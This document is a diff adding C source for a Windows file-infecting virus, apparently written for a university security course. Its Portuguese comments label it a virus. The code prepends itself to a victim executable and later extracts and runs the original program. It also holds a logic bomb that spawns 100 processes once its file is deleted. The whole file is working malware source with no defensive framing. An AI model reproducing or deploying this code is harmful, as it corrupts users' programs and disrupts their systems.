@@ -1,0 +1,171 @@
+#include <stdio.h>
+#include <windows.h>
+#include <string.h>
+#include <libgen.h>
+#include <io.h>
+
+
+//FunÃ§Ã£o de replicacao
+void replicacao() {
+    FILE *fvirus;
+    FILE *fvitima;
+    FILE *fvvitima;
+    char virus[200000];
+    char vitima[200000];
+    int tamanhoVirus, tamanhoVitima;
+
+// LÃª o o conteudo do virus, da vitima, tamanho do virus e da vÃ­tima
+
+    fvirus = fopen ("virus.exe", "rb");
+
+    fseek(fvirus, 0L, SEEK_END);
+    tamanhoVirus = ftell(fvirus);
+    fseek(fvirus, 0L, SEEK_SET);
+    fread(virus, sizeof(char), tamanhoVirus, fvirus);
+    fclose(fvirus);
+
+
+    fvitima = fopen ("vitima.exe", "rb");
+    fseek(fvitima, 0L, SEEK_END);
+    tamanhoVitima = ftell(fvitima);
+    fseek(fvitima, 0L, SEEK_SET);
+    fread(vitima, sizeof(char), tamanhoVitima, fvitima);
+    fclose(fvitima);
+
+
+    
+    remove("vitima.exe");
+    
+    // Escreve o conteudo do virus, tamanho do vÃ­rus, conteÃºdo da vÃ­tima e tamanho da vÃ­tima, respectivamente   
+    
+    fvvitima = fopen("vitima.exe", "ab");
+    
+    fwrite(virus, sizeof(char), tamanhoVirus, fvvitima);
+
+    fwrite (&tamanhoVirus, sizeof(int), 1, fvvitima);
+
+    fwrite(vitima, sizeof(char), tamanhoVitima, fvvitima);
+        
+    fwrite (&tamanhoVitima, sizeof(int), 1, fvvitima);
+
+    fclose(fvvitima);
+
+}
+
+// FunÃ§Ã£o da bomba lÃ³gica
+void teste() {
+    printf("Bomba logica");
+}
+
+void processos_bombalogica(TCHAR* nome) {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si); 
+    TCHAR* cmd = "teste";
+    //char * comando = strcat(nome, " -cl bombalogica()");
+    int i;
+    //printf("%s\n", comando);
+    for(i = 0; i < 100; i++) {
+        if(!CreateProcess("memory.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+            printf("Erro ao criar processo");
+        }
+        else {
+            printf("Processo criado");
+        }
+    }
+}
+
+// FunÃ§Ã£o de execuÃ§Ã£o
+
+int main(int argc, char *argv[]) {
+    
+    //CÃ³digo padrÃ£o para a criaÃ§Ã£o de processos
+    
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    
+    // Definindo variaveis para a execução de processos raiz (soluciona o problema de vitima_tmp.exe não abrir em um novo console)
+    SHELLEXECUTEINFO sei = { 0 };
+    sei.cbSize = sizeof(SHELLEXECUTEINFO);
+    sei.lpFile = "D:\\IBMEC\\AP1SEGURANCA\\vitima_tmp.exe";
+    sei.nShow = SW_SHOWDEFAULT;
+    
+    // Definindo variÃ¡veis
+    
+    // Pega o nome dO arquivo executÃ¡vel do cÃ³digo atual
+    char * nomeArquivoC = argv[0];
+    TCHAR* nomeArquivo = nomeArquivoC;
+    nomeArquivoC = basename(nomeArquivoC);
+    
+    printf("Virus em execuÃ§Ã£op\n");
+    
+    // Caso tenha o argumento "bomba"
+    
+    if(argc>1 && strcmp(argv[1], "bomba")==0) {
+        while(1) {
+            if(access(nomeArquivoC, F_OK)==-1) {
+                printf("Arquivo excluido, disparando bomba logica");
+                processos_bombalogica(nomeArquivo);
+                break;
+            }
+            else {
+                printf("Arquivo ainda existe");
+                Sleep(1000);
+            }
+        }
+    }
+    
+    
+    // Caso o vÃ­rus seja o original:
+    
+    else if(strcmp(nomeArquivoC, "virus.exe")==0 && argc == 1) {
+        replicacao();
+        
+        if(!CreateProcess(NULL, "virus.exe bomba", NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        printf("Erro ao criar processo");
+    }
+        else {
+            printf("Processo criado\n");
+    }
+    }
+    
+    // Caso seja uma vÃ­tima infectada:
+    
+    else if(strcmp(nomeArquivoC, "virus.exe")!=0 && argc == 1){
+        
+        FILE *fvitima = fopen(nomeArquivoC, "rb");
+        int tamanhoVitima;
+        
+        // LÃª o tamanho da vÃ­tima original no arquivo infectado;
+        
+        fseek(fvitima, -sizeof(int), SEEK_END);
+        fread(&tamanhoVitima, sizeof(int), 1, fvitima);
+        fseek(fvitima, -tamanhoVitima-sizeof(int), SEEK_END);
+        
+        // LÃª o conteÃºdo da vitima original no arquivo infectado;
+        
+        char vitima[200000];
+        fread(vitima, sizeof(char), tamanhoVitima, fvitima);
+        fseek(fvitima, 0, SEEK_SET);
+        fclose(fvitima);
+        
+        // Escreve o arquivo vitima_tmp.exe para a execuÃ§Ã£o do cÃ³digo da vÃ­tima original
+        
+        FILE *fvitima_tmp = fopen("vitima_tmp.exe", "wb");
+        
+        fwrite(vitima, sizeof(char), tamanhoVitima, fvitima_tmp);
+        
+        fclose(fvitima_tmp);
+        
+        CreateProcess("D:\\IBMEC\\AP1SEGURANCA\\vitima_tmp.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+        
+        //CreateProcess(NULL, "vitima.exe bomba", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+        
+    }
+    
+    return 0;
+    
+}
